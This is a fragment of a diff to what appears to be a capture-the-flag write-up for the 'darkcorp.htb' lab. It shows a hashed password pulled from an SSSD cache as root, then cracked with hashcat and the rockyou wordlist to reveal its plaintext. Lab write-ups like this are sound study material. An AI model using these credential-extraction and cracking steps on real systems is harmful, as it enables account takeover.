@@ -1322,7 +1322,15 @@ root@drip:/var/lib/sss/db# cat cache_darkcorp.htb.ldb | grep -a 'cachedPassword'
 1736373877initgrExpireTimestamp0ccacheFile"FILE:/tmp/krb5cc_1730414101_B5njULcachedPasswordj$6$5wwc6mW6nrcRD4Uu$9rigmpKLyqH/.hQ520PzqN2/6u6PZpQQ93ESam/OHvlnQKQppk6DrNjL6ruzY7WJkA2FjPgULqxlb73xNw7n5.cachedPasswordType1lastCachedPasswordChange
 ```
 
+```python
+hashcat '$6$5wwc6mW6nrcRD4Uu$9rigmpKLyqH/.hQ520PzqN2/6u6PZpQQ93ESam/OHvlnQKQppk6DrNjL6ruzY7WJkA2FjPgULqxlb73xNw7n5.' /usr/share/wordlists/rockyou.txt
 
+$6$5wwc6mW6nrcRD4Uu$9rigmpKLyqH/.hQ520PzqN2/6u6PZpQQ93ESam/OHvlnQKQppk6DrNjL6ruzY7WJkA2FjPgULqxlb73xNw7n5.:!QAZzaq1
+```
+
+This hash cracked
+
+# 
 
 
 
